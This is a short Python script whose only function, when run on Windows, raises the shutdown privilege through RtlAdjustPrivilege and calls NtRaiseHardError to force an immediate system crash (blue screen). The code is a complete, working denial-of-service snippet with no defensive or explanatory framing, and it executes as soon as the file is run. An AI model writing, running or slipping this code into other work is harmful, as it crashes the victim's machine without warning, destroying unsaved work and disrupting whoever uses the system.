import os

def bluescreen():
    # This function will cause a system crash (blue screen) on Windows
    if os.name == 'nt':
        import ctypes
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))

if __name__ == "__main__":
    bluescreen()